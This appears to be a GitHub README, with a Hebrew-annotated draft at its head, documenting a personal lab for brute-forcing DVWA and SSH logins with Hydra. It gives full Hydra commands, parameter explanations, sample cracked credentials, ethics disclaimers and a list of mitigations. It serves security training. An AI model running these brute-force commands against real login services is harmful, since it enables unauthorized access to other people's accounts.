➤ Hydra Command (Brute-force on a web login form):

hydra -L users.txt -P passwords.txt 127.0.0.1 http-post-form "/login.php:username=^USER^&password=^PASS^:F=Incorrect"

הסבר הפרמטרים:
-L users.txt — רשימת שמות משתמשים

-P passwords.txt — רשימת סיסמאות

127.0.0.1 — היעד (במעבדה שלך זה ה־DVWA בתוך Docker)

http-post-form — סוג התקיפה המתבצעת בטופס התחברות

"F=Incorrect" — מה Hydra מזהה ככישלון (מתוך תגובת השרת)



---

💡 אפשרות נוספת — Brute Force על SSH

hydra -L users.txt -P passwords.txt ssh://127.0.0.1


---

✔ Expected Output (דוגמה אמיתית):

[22][ssh] host: 127.0.0.1   login: hanna   password: P@ssw0rd


---

📌 Usage Notes (מופיע יפה ב־README)

This attack was performed only inside a private, isolated cybersecurity lab.

No real systems, accounts, or servers were targeted.

Wordlists included in this repo are for educational practice only.

Hydra is a powerful tool — use responsibly and legally.

# 🔐 Hydra Lab — Brute Force Attack in an Isolated Environment

This repository documents my practice with *Hydra, a password-cracking tool used for ethical security testing in a **fully isolated cybersecurity lab*.

> ⚠ *Ethical Use Only*  
> All brute force tests are performed *only* against intentionally vulnerable systems such as DVWA inside my isolated lab.  
> I do *NOT* test Hydra on real systems, accounts, or networks.

---

## 🎯 Lab Goals
- Understand how brute force works in a controlled lab  
- Learn Hydra basic commands  
- Practice attacking *weak login forms*  
- Strengthen methodology: recon → identify parameters → brute force → mitigation

---

## 🧱 Lab Topology

- 🖥 *Attacker:* Kali Linux  
  - Tools: hydra, nmap, burpsuite, wget

- 🎯 *Target:* DVWA (Damn Vulnerable Web App)  
  - Runs in a Docker container in my lab  
  - Accessible only inside the private network (no external access)

---

## 🛰 Step 1 — Identify Login Parameters

Example target login form inside DVWA:

http://<DVWA-IP>/login.php

Using browser inspector or Burp Suite, identify:

- username field  
- password field  
- form action path  
- request method (GET/POST)

Example DVWA parameters:

- Form: POST /login.php
- User field: username
- Password field: password

---

## 🚀 Step 2 — Hydra Command (Example)

```bash
hydra -L users.txt -P passwords.txt <DVWA-IP> http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed"

Explanation:

-L users.txt → list of usernames

-P passwords.txt → list of passwords

^USER^ / ^PASS^ → Hydra placeholders

"Login failed" → error message Hydra uses to detect failed attempts



---

📄 Example Output

[80][http-post-form] host: 172.20.0.4   login: admin   password: password123

Weak credentials discovered during testing.


---

🛡 Mitigations

Enforce strong passwords

Add rate limiting

Add CAPTCHA or lockouts

Disable default/weak credentials

Log failed login attempts

Use MFA where possible



---

📂 Repository Structure

hydra-lab/
  ├── README.md
  ├── users.txt            # Example username list
  ├── passwords.txt        # Example password list
  ├── hydra-command.txt    # Example command used
  └── screenshot.png       # (optional) lab screenshot


---

🔗 Related Projects

🧪 Lab Setup:
https://github.com/Hanna-Solo/lab-setup

🧩 CTF Writeups:
https://github.com/Hanna-Solo/ctf-writeups

🛠 Metasploit Lab:
https://github.com/Hanna-Solo/metasploit-lab# hydra-lab
